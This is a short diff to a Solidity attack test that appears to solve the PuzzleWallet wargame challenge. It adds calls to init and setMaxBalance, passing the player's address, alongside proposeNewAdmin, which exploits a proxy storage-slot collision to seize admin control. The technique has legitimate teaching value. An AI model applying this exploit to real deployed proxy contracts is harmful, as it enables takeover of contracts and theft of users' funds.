@@ -31,7 +31,9 @@ contract PuzzleWalletAttackTest is PRBTest {
 
     function testPuzzleWalletAttack() public {
         vm.startPrank(playerAddress);
+        PuzzleWallet(payable(puzzleWalletInstance)).init(uint256(uint160(playerAddress)));
         PuzzleProxy(payable(puzzleWalletInstance)).proposeNewAdmin(payable(playerAddress));
+        PuzzleWallet(payable(puzzleWalletInstance)).setMaxBalance(uint256(uint160(playerAddress)));
 
     }
 }
